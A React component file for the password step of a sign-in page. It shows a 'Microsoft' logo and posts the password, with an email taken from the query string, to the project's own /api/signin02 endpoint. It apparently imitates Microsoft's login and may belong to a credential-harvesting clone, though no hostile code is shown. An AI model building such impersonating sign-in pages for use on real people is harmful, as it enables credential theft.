import React, { useState } from "react";
import "../../styles/login.css";
import logo from "../../images/navbar/navbar_icon.png";
import axios from "axios";
import queryString from "query-string";
import { useLocation } from "react-router-dom";

function Login02() {
    const [pswrd, setPswrd] = useState();
    const { search } = useLocation();
    const qs = queryString.parse(search);
    console.log(qs);

    return (
        <div>
            <div className="login">
                <div className="login-main">
                    <img src={logo} alt="Microsoft" />
                    <h2>Sign in</h2>
                    <form
                        method="POST"
                        // onSubmit={() => handleSubmit()}
                        id="login02"
                        className="login-main-email"
                        action={`/api/signin02?email=${qs.email}`}
                    >
                        <input
                            type="password"
                            placeholder="Password"
                            name="password"
                            onChange={(data) => setPswrd(data)}
                        />
                    </form>
                    <p>
                        <span>Forgot Password!</span>
                    </p>
                    <div className="login-main-button">
                        <button form="login02" type="submit">
                            Sign in
                        </button>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Login02;
